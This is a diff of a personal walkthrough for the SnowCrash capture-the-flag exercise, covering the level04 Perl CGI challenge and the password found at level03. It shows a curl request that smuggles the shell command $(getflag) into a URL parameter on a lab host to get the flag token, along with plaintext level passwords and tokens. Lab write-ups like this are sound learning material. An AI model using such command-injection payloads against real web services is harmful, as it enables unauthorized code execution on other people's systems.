@@ -156,8 +156,14 @@ level03@SnowCrash:~$ su level04
 Password:qi0maab88jeaj46qoumi7maus
 ```
 ## level04, fucking perl
-Executing it doesn't print shit, tried editing 
+Executing it doesn't print shit, tried editing after copying file to /tmp, file has SUID permission
+
+After googling *GCI*, **In Perl, CGI(Common Gateway Interface) is a protocol for executing scripts via web requests.**
 ```
+$curl http://10.12.100.115:4747/\?x\=blah
+blah
+```
+*using the x param, curl prints whatever is passed to it in x=*
 curl http://10.12.100.115:4747/\?x\=$\(getflag\)
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 ```
